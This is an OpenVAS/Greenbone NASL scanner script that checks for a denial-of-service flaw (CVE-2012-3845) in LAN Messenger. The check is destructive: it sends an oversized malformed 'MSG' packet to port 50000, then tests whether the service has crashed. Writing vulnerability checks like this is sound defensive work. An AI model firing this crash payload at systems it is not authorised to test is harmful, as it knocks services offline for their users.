# SPDX-FileCopyrightText: 2012 Greenbone AG
# Some text descriptions might be excerpted from (a) referenced
# source(s), and are Copyright (C) by the respective right holder(s).
#
# SPDX-License-Identifier: GPL-2.0-only

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.802627");
  script_version("2024-06-27T05:05:29+0000");
  script_cve_id("CVE-2012-3845");
  script_tag(name:"cvss_base", value:"5.0");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:N/I:N/A:P");
  script_tag(name:"last_modification", value:"2024-06-27 05:05:29 +0000 (Thu, 27 Jun 2024)");
  script_tag(name:"creation_date", value:"2012-05-03 12:12:12 +0530 (Thu, 03 May 2012)");
  script_name("LAN Messenger Malformed Initiation Request Remote DoS Vulnerability");
  script_category(ACT_DENIAL);
  script_copyright("Copyright (C) 2012 Greenbone AG");
  script_family("Denial of Service");
  script_dependencies("find_service.nasl");
  script_require_ports(50000);

  script_xref(name:"URL", value:"http://xforce.iss.net/xforce/xfdb/75319");
  script_xref(name:"URL", value:"http://www.securityfocus.com/bid/53333");
  script_xref(name:"URL", value:"http://www.exploit-db.com/exploits/18816");
  script_xref(name:"URL", value:"http://www.securityfocus.com/archive/1/522545");
  script_xref(name:"URL", value:"http://packetstormsecurity.org/files/112389/VL-537.txt");
  script_xref(name:"URL", value:"http://www.vulnerability-lab.com/get_content.php?id=537");

  script_tag(name:"impact", value:"Successful exploitation may allow remote attackers to cause the
  application to crash, creating a denial of service condition.");
  script_tag(name:"affected", value:"LAN Messenger versions 1.2.28 and prior");
  script_tag(name:"insight", value:"The flaw is triggered when processing a malformed initiation
  request and can be exploited to cause a denial of service via a specially crafted
  packet.");
  script_tag(name:"solution", value:"No known solution was made available for at least one year since the disclosure of this vulnerability.
Likely none will be provided anymore.
General solution options are to upgrade to a newer release, disable respective features, remove the product or replace the product by another one.");
  script_tag(name:"summary", value:"LAN Messenger is prone to a denial of service (DoS) vulnerability.");

  script_tag(name:"solution_type", value:"WillNotFix");
  script_tag(name:"qod_type", value:"remote_analysis");

  exit(0);
}


## LAN Messenger Port
port = 50000;
if(!get_port_state(port)){
  exit(0);
}

soc = open_sock_tcp(port);
if(!soc) {
  exit(0);
}

send(socket:soc, data:"MSG");
res = recv(socket:soc, length:1024);

if("PUBKEY" >!< res){
  exit(0);
  close(soc);
}

req = "MSG" + crap(500000);
send(socket:soc, data:req);
close(soc);

sleep(2);

soc1 = open_sock_tcp(port);
if(!soc1)
{
  security_message(port);
  exit(0);
}
close(soc1);
